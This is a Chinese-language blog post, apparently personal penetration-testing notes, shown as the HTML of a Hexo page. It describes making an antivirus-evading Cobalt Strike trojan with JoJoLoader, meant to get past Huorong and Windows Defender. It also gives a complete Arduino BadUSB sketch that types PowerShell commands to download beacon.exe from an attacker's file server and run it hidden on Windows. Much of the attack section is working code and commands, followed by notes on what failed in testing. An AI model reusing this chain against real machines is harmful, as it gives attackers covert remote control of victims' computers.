@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="记录制作免杀木马，使用budusb进行近源攻击，绕过火绒和Windows defender，实现cs上线。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="badusb上线cs">
+<meta property="og:url" content="http://example.com/2024/08/16/%E6%B8%97%E9%80%8F/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB/badusb%E4%B8%8A%E7%BA%BFcs/index.html">
+<meta property="og:site_name" content="Sean&#39;s Blog">
+<meta property="og:description" content="记录制作免杀木马，使用budusb进行近源攻击，绕过火绒和Windows defender，实现cs上线。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20240816104912676.png">
+<meta property="article:published_time" content="2024-08-16T01:24:35.000Z">
+<meta property="article:modified_time" content="2024-08-16T08:38:46.442Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="网络安全 课程笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20240816104912676.png">
+
+<link rel="canonical" href="http://example.com/2024/08/16/%E6%B8%97%E9%80%8F/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB/badusb%E4%B8%8A%E7%BA%BFcs/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>badusb上线cs | Sean's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sean's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/16/%E6%B8%97%E9%80%8F/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB/badusb%E4%B8%8A%E7%BA%BFcs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/banner.jpg">
+      <meta itemprop="name" content="Sean">
+      <meta itemprop="description" content="热爱可抵岁月漫长">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sean's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          badusb上线cs
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-08-16 09:24:35 / 修改时间：16:38:46" itemprop="dateCreated datePublished" datetime="2024-08-16T09:24:35+08:00">2024-08-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB/" itemprop="url" rel="index"><span itemprop="name">近源攻击</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>记录制作免杀木马，使用budusb进行近源攻击，绕过火绒和Windows defender，实现cs上线。</p>
+<span id="more"></span>
+
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>硬件：badusb from tb</p>
+<p>系统：</p>
+<ul>
+<li>受害机：Windows11</li>
+<li>攻击机：kali2023</li>
+</ul>
+<p>软件：</p>
+<ul>
+<li>Arduino 1.8.4</li>
+<li>JoJoLoader</li>
+<li>CobaltStrike 4.8</li>
+</ul>
+<h1 id="制作木马"><a href="#制作木马" class="headerlink" title="制作木马"></a>制作木马</h1><h2 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h2><p>下载资源：<a target="_blank" rel="noopener" href="https://www.ddosi.org/">https://www.ddosi.org/</a></p>
+<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>仅支持Linux</p>
+<p>server监听端口默认为50050，可通过<code>vi teamserer</code>进行修改</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver [server_ip] [password]</span><br></pre></td></tr></table></figure>
+
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>理论上有Java就行，实际启动参数应该与破解者有关，不同版本的启动方式应不同</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:uHook.jar -jar cobaltstrike-client.jar $*</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>创建监听</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://github.com/Pizz33/JoJoLoader?tab=readme-ov-file%EF%BC%8C%E5%88%B6%E4%BD%9Cstageless">https://github.com/Pizz33/JoJoLoader?tab=readme-ov-file，制作stageless</a> payload，得到二进制木马beacon_x64.bin（文件名必须是这个）</p>
+<h2 id="JoJoLoader环境"><a href="#JoJoLoader环境" class="headerlink" title="JoJoLoader环境"></a>JoJoLoader环境</h2><p>安装MinGW </p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/niXman/mingw-builds-binaries/releases%EF%BC%8C%E9%80%89%E6%8B%A9**%E8%BE%83%E6%96%B0**%E7%9A%84x86_64-xxx-release-posix-seh-ucrt-xxx.7z">https://github.com/niXman/mingw-builds-binaries/releases，选择**较新**的x86_64-xxx-release-posix-seh-ucrt-xxx.7z</a></li>
+<li>设置环境变量：系统变量中Path添加mingw&#x2F;bin的路径</li>
+<li><code>gcc -v</code>验证</li>
+</ul>
+<p>安装rust</p>
+<ul>
+<li>从官网<a target="_blank" rel="noopener" href="https://www.rust-lang.org/tools/install%E4%B8%8B%E8%BD%BDrustup-init.exe%EF%BC%8C%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%9C%80%E8%A6%81%E6%A2%AF%E5%AD%90">https://www.rust-lang.org/tools/install下载rustup-init.exe，安装过程中需要梯子</a></li>
+<li>参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/qumogu/p/16412144.html%E8%BF%9B%E8%A1%8C**Customize**%E5%AE%89%E8%A3%85gnu%E5%B7%A5%E5%85%B7%E9%93%BE">https://www.cnblogs.com/qumogu/p/16412144.html进行**Customize**安装gnu工具链</a></li>
+<li><code>rustc --version</code>验证</li>
+</ul>
+<p>beacon_x64.bin置于JoJoLoader项目根目录下，执行”一键生成.bat”，免杀木马存放于output中</p>
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p>Q：执行一键生成.bat”闪退</p>
+<p>A：编辑”一键生成.bat”，在末尾添加一行，可看到报错内容</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+
+<p>E：Linking with <code>x86_64-w64-mingw32-gcc</code> failed</p>
+<p>S：gcc环境没整好，或者版本不对</p>
+<h1 id="远程文件下载"><a href="#远程文件下载" class="headerlink" title="远程文件下载"></a>远程文件下载</h1><p>攻击机需开放文件下载，使受害机能够下载木马文件。（badusb可写入指令的空间太小，不可直接写入木马文件）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer [port] <span class="comment">#python2</span></span><br><span class="line">python -m http.server [port] <span class="comment">#python3</span></span><br></pre></td></tr></table></figure>
+
+<p>Windows远程下载方法</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span></span><br><span class="line">(<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile</span><br><span class="line">certutil</span><br></pre></td></tr></table></figure>
+
+<p>tips:文件路径和木马文件名全<strong>大写</strong></p>
+<h1 id="Ardunio烧录"><a href="#Ardunio烧录" class="headerlink" title="Ardunio烧录"></a>Ardunio烧录</h1><p>版本太新不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;</span><br><span class="line">  // putpower shell your setup code here, to run once</span><br><span class="line">  Keyboard.begin();//开始键盘通讯 </span><br><span class="line">  delay(3000);//延时 </span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI);//win键 </span><br><span class="line">  delay(500);</span><br><span class="line">  Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">  Keyboard.release(&#x27;r&#x27;); </span><br><span class="line">  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法</span><br><span class="line">  Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">  delay(500);</span><br><span class="line">  Keyboard.println(&quot;cmd /T:01 /K \&quot;echo off &amp;&amp; mode con:COLS=15 LINES=1\&quot;&quot;);   </span><br><span class="line">  Keyboard.press(KEY_RETURN); </span><br><span class="line">  Keyboard.release(KEY_RETURN); </span><br><span class="line">  delay(3000);</span><br><span class="line">  Keyboard.println(&quot;powershell\n&quot;);</span><br><span class="line">  Keyboard.println(&quot;$clnt = new-object system.net.webclient;\n&quot;);</span><br><span class="line">  Keyboard.println(&quot;$url= &#x27;http://[file_server_ip]/beacon.exe&#x27;;\n&quot;);  //远程服务器ps1远控地址</span><br><span class="line">  Keyboard.println(&quot;$file = &#x27;c:\\users\\public\\downloads\\beacon.exe&#x27;;\n&quot;);      //下载到目标存放文件的地址</span><br><span class="line">  Keyboard.println(&quot;$clnt.downloadfile($url,$file);\n&quot;);  //采用分段执行绕过防火墙进程防护</span><br><span class="line">  Keyboard.println(&quot;start-process -filepath \&quot;c:\\users\\public\\downloads\\beacon.exe\&quot; -windowstyle hidden;\n&quot;); //后台执行</span><br><span class="line">  delay(2000);</span><br><span class="line">  Keyboard.println(&quot;exit;\n&quot;); </span><br><span class="line">  delay(700);</span><br><span class="line">  Keyboard.println(&quot;exit;&quot;);  </span><br><span class="line">  Keyboard.press(KEY_RETURN);</span><br><span class="line">  Keyboard.release(KEY_RETURN);</span><br><span class="line">  Keyboard.press(KEY_CAPS_LOCK); </span><br><span class="line">  Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">  Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void loop() &#123;</span><br><span class="line">  // put your main code here, to run repeatedly:</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码编写tips：</p>
+<ul>
+<li>注意文件下载后的存放地址，普通用户是否有写入权限</li>
+<li>很多地方需要<code>delay()</code>，且不同受害机需要的时间可能不一样（原理未知）</li>
+</ul>
+<p>插入badusb，从工具-端口中选择（一般会带有Arduino字样），再根据badusb型号选择开发板</p>
+<p><img src="https://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20240816104912676.png" alt="image-20240816104912676"></p>
+<p>保存-编译-上传</p>
+<p>E：开着虚拟机会导致上传失败</p>
+<p>A：……</p>
+<h1 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h1><p>测试多台win10&amp;win11，有几类情况</p>
+<ol>
+<li>文件无法下载，应该是打开cmd后的delay时间不够</li>
+<li>文件执行无法上线，应该是被查杀了？？</li>
+<li>窗口无法退出，应该是执行文件后delay时间不够</li>
+</ol>
+<h1 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h1><p>win11的命令行窗口和win10的不一样，无法执行窗口缩小</p>
+<p>开着虚拟机时插入usb会有点问题</p>
+<p>在受害机本身开着大写锁定的情况下会出问题</p>
+<p>无法绕过360</p>
+<p>delay时长难以把控</p>
+<p>执行过程太容易被打断</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/08/12/crypto/hashcat%E7%A0%B4%E8%A7%A3excel%E5%AF%86%E7%A0%81/" rel="prev" title="hashcat破解excel密码">
+      <i class="fa fa-chevron-left"></i> hashcat破解excel密码
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC"><span class="nav-number">2.</span> <span class="nav-text">制作木马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cobaltstrike"><span class="nav-number">2.1.</span> <span class="nav-text">cobaltstrike</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-number">2.1.1.</span> <span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-number">2.1.2.</span> <span class="nav-text">客户端</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JoJoLoader%E7%8E%AF%E5%A2%83"><span class="nav-number">2.2.</span> <span class="nav-text">JoJoLoader环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95"><span class="nav-number">2.2.1.</span> <span class="nav-text">踩坑记录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-number">3.</span> <span class="nav-text">远程文件下载</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ardunio%E7%83%A7%E5%BD%95"><span class="nav-number">4.</span> <span class="nav-text">Ardunio烧录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C"><span class="nav-number">5.</span> <span class="nav-text">测试结果</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#todo"><span class="nav-number">6.</span> <span class="nav-text">todo</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/banner.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description">热爱可抵岁月漫长</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Seanxz401" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Seanxz401" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sean</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
